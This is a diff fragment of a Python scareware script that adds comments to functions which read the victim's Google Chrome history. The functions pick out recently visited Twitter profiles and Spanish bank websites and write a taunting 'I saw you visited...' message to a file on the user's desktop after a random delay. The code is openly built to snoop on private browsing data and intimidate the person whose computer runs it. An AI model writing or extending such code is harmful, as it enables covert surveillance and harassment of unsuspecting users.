@@ -24,15 +24,17 @@ def check_steam_games(hacker_file):
 def delay_action():
     n_hours = randrange(1, 4)
     print("Sleeping {} hours".format(n_hours))
-    # sleep(n_hours * 60 * 60)
+    # sleep(n_hours * 60 * 60) 1 to 3 hour timer
 
 
+# File creation
 def create_hacker_file(user_path):
     hacker_file = open(user_path + "Escritorio/" + HACKER_FILE_NAME, "w")
     hacker_file.write("Hi!!\n\n")
     return hacker_file
 
 
+# Google Chrome history database search. SQL code was copied.
 def get_chrome_history(user_path):
     urls = None
     while not urls:
@@ -49,6 +51,7 @@ def get_chrome_history(user_path):
             sleep(3)
 
 
+# Regular expression to find last twitter accounts visited
 def check_twitter_profiles_and_scare(hacker_file, chrome_history):
     profiles_visited = []
     for item in chrome_history:
@@ -58,6 +61,7 @@ def check_twitter_profiles_and_scare(hacker_file, chrome_history):
     hacker_file.write("I saw you visited these people's twitter profile: {}...".format("\n".join(profiles_visited)))
 
 
+# Checking last bank web visited
 def check_bank_account(hacker_file, chrome_history):
     his_bank = None
     banks = ["BBVA", "Caixa Bank", "Santander", "Bankia"]
